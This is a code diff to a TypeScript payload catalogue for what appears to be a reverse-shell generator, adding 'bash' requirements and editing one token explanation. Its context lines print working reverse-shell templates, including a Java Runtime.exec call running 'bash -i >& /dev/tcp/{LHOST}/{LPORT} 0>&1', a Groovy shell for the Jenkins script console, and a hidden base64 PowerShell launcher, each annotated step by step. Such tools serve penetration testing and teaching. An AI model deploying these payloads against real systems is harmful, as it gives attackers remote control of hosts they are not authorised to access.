@@ -22,7 +22,7 @@ const nodeParts = (sh: string) => [
 export const CODE_SHELLS: PayloadDef[] = [
   {
     id: "groovy-linux", generator: "shell", title: "Groovy ProcessBuilder (Linux)", os: "linux",
-    contexts: ["groovy"], requires: [], template: groovy("/bin/bash"), parts: groovyParts("/bin/bash"), listeners: REVERSE,
+    contexts: ["groovy"], requires: ["bash"], template: groovy("/bin/bash"), parts: groovyParts("/bin/bash"), listeners: REVERSE,
     notes: ["Used in the Jenkins /script console or any Groovy console: paste it there, not into a shell."],
   },
   {
@@ -42,7 +42,7 @@ export const CODE_SHELLS: PayloadDef[] = [
   },
   {
     id: "java-linux", generator: "shell", title: "Java Runtime.exec (Linux)", os: "linux",
-    contexts: ["java"], requires: [], listeners: REVERSE,
+    contexts: ["java"], requires: ["bash"], listeners: REVERSE,
     template: `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"});`,
     parts: [
       { token: "Runtime.getRuntime().exec(", explain: "Starts an OS process from Java." },
@@ -60,7 +60,7 @@ export const CODE_SHELLS: PayloadDef[] = [
       { token: "Runtime.getRuntime().exec(", explain: "Starts an OS process from Java." },
       { token: "-nop", explain: "No profile: skips the user's PowerShell profile." },
       { token: "-w hidden", explain: "Hides the window." },
-      { token: "-e", explain: "Runs the UTF-16LE base64 script, which has no quotes to break the Java string." },
+      { token: "powershell -nop -w hidden -e", explain: "Runs the UTF-16LE base64 script, which has no quotes to break the Java string." },
     ],
     notes: ["Used for Java gadgets on a Windows host; avoids anything that depends on jjs.exe (gone in Java 15+)."],
   },
